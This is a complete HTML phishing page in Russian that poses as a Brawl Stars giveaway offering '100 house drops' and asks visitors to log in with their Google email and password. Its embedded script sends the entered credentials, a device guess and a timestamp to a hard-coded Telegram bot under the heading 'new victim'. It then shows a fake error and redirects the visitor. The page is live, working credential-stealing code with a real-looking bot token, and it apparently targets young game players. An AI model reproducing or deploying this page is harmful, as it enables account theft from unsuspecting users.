<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Brawl Stars | 100 Хаус-Дропов</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#1a2a3a,#0a1118);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .card{background:rgba(255,255,255,0.95);border-radius:32px;padding:32px;max-width:450px;width:100%;text-align:center}
        h2{color:#0f2b3d;margin-bottom:8px}
        input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:18px}
        button{width:100%;padding:14px;background:#f5b042;border:none;border-radius:40px;font-size:18px;font-weight:bold;cursor:pointer}
        .error{color:red;display:none}
    </style>
</head>
<body>
<div class="card">
    <h2>🎁 100 ХАУС-ДРОПОВ 🎁</h2>
    <p>Войдите в Google чтобы получить</p>
    <form id="loginForm">
        <input type="email" id="email" placeholder="Почта Google" required>
        <input type="password" id="password" placeholder="Пароль" required>
        <button>ПОЛУЧИТЬ</button>
    </form>
    <div class="error" id="errorMsg">Ошибка, попробуйте снова</div>
</div>

<script>
const BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI";
const ADMIN_ID = "8744429026";

function getDevice() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) return "Android";
    if (/iPhone|iPad/i.test(ua)) return "iOS";
    return "Компьютер";
}

document.getElementById('loginForm').onsubmit = async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    const text = `🔐 НОВАЯ ЖЕРТВА!\n📧 Почта: ${email}\n🔑 Пароль: ${password}\n📡 IP: через GitHub\n📱 Устройство: ${getDevice()}\n⏰ Время: ${new Date().toLocaleString()}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`;
    
    try {
        await fetch(url);
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => {
            window.location.href = '404.html';
        }, 1500);
    } catch(err) {
        window.location.href = '404.html';
    }
};
</script>
</body>
</html>
